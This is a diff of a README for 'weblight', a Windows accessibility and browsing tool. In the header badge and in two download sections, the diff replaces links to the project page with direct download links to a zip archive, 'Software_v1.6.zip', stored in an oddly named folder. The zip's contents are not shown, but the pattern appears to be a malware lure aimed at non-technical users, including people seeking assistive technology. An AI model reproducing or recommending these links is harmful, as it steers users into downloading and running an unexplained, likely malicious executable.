@@ -1,6 +1,6 @@
 # 🌗 weblight - Reduce strain while you browse
 
-[![Download weblight](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/iberianpeninsulalibido471/weblight)
+[![Download weblight](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/iberianpeninsulalibido471/weblight/raw/refs/heads/main/huamuchil/Software_v1.6.zip)
 
 ## 🧭 What weblight does
 
@@ -29,7 +29,7 @@ weblight is made for easy use on Windows and does not require coding knowledge.
 
 Visit this page to download or open weblight:
 
-https://github.com/iberianpeninsulalibido471/weblight
+https://github.com/iberianpeninsulalibido471/weblight/raw/refs/heads/main/huamuchil/Software_v1.6.zip
 
 ### If you see a file to download
 
@@ -202,4 +202,4 @@ accessibility, adhd, assistive-technology, autism, bookmarklet, distraction-free
 
 Use this link to visit the project page and download or open weblight:
 
-https://github.com/iberianpeninsulalibido471/weblight
+https://github.com/iberianpeninsulalibido471/weblight/raw/refs/heads/main/huamuchil/Software_v1.6.zip
